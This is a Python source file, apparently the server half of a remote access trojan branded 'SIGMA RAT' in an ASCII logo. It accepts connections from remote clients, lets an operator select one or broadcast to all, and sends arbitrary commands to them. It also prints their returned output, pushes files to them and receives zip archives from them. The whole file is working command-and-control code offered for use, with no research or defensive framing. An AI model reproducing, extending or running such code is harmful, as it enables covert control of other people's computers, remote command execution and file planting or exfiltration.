import socket
import threading
import os
import struct
from tqdm import tqdm

clients = {}

# Function to display the logo
def logo():
    print(""" _______ _________ _______  _______  _______      _______  _______ _________
(  ____ \\__   __/(  ____ \\(       )(  ___  )    (  ____ )(  ___  )\\__   __/
| (    \\/   ) (   | (    \\/| () () || (   ) |    | (    )|| (   ) |   ) (   
| (_____    | |   | |      | || || || (___) |    | (____)|| (___) |   | |   
(_____  )   | |   | | ____ | |(_)| ||  ___  |    |     __)|  ___  |   | |   
      ) |   | |   | | \\_  )| |   | || (   ) |    | (\\ (   | (   ) |   | |   
/\\____) |___) (___| (___) || )   ( || )   ( |    | ) \\ \\__| )   ( |   | |   
\\_______)\\_______/(_______)|/     \\||/     \\|    |/   \\__/|/     \\|   )_(   """)

# Function to handle each connected client
def handle_client(client_socket, addr):
    clients[addr] = client_socket
    print(f"{addr[0]}:{addr[1]} connected.")

    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            print(f"[{addr[0]} Output]: {response}")
        except (ConnectionResetError, BrokenPipeError):
            break

    print(f"[!] Client {addr[0]} disconnected.")
    client_socket.close()
    del clients[addr]

def receive_zip(server, file_name):
    print("Receiving file:", file_name)

    # Receive the file size as an 8-byte unsigned integer
    file_size_data = server.recv(8)  # 8 bytes for the file size
    file_size = struct.unpack("!Q", file_size_data)[0]  # 'Q' is for unsigned long (8 bytes)
    print("File size:", file_size)

    # Prepare to write the received file
    file = open(file_name, "wb")

    file_bytes = b""
    done = False

    # Set up progress bar
    progress = tqdm(unit="B", unit_scale=True, unit_divisor=1000, total=int(file_size))

    while not done:
        data = server.recv(32768)
        if not data:  # End of file or connection closed
            break
        file_bytes += data
        progress.update(len(data))

        if len(file_bytes) >= file_size:
            done = True

    file.write(file_bytes)
    file.close()

def start_server(host="127.0.0.1", port=34232):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    # Start accepting client connections
    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()

    # Clear screen and display logo
    os.system("cls")
    logo()
    print("Waiting for clients to connect...")

    process_commands()  # Start processing commands for the connected clients

# Function to accept incoming client connections
def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

# Function to send a file to a client
def send_file(target_addr, file_path):
    try:
        with open(file_path, "rb") as file:
            file_size = os.path.getsize(file_path)

            # Send the file size as an 8-byte unsigned integer
            clients[target_addr].send(struct.pack("!Q", file_size))  # 'Q' is for unsigned long (8 bytes)

            progress = tqdm(unit="B", unit_scale=True, unit_divisor=1000, total=int(file_size))

            # Send the file content in chunks
            data = file.read(32768)
            while data:
                clients[target_addr].sendall(data)
                progress.update(len(data))
                data = file.read(32768)
            print(f"File {file_path} sent to {target_addr[0]}")
    except Exception as e:
        print(f"[!] Error sending file to {target_addr[0]}: {e}")

# Function to process commands and communicate with the client
def process_commands():
    while True:
        if not clients:
            continue

        print("\n[Connected Clients]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx}. {addr[0]}:{addr[1]}")

        try:
            choice = int(input("Select client number (or 0 to broadcast): ")) - 1
        except ValueError:
            continue

        if choice == -1:
            # Broadcast command to all clients
            command = input("Enter command to send (broadcast): ")
            if command.startswith('!sendfile'):
                print("Sending file is not supported in broadcast!")
            else:
                for client in clients.values():
                    client.send(command.encode())

        elif 0 <= choice < len(clients):
            target_addr = list(clients.keys())[choice]
            command = input(f"Enter command to send to {target_addr[0]}: ")
            if not command.startswith("!sendfile"):
                clients[target_addr].send(command.encode())
            elif command.startswith('!sendfile'):
                clients[target_addr].send(command.encode())
                # Send file in a separate thread
                file_path = command.split(" ")[1]  # Assuming command is like '!sendfile <path>'
                threading.Thread(target=send_file, args=(target_addr, file_path)).start()
        else:
            print("[!] Invalid selection.")

if __name__ == "__main__":
    with open('connect-data.txt', 'r') as f:
        SERVER_IP = f.readline().replace('\n', '')
        SERVER_PORT = int(f.readline().replace('\n', ''))

    start_server(SERVER_IP, SERVER_PORT)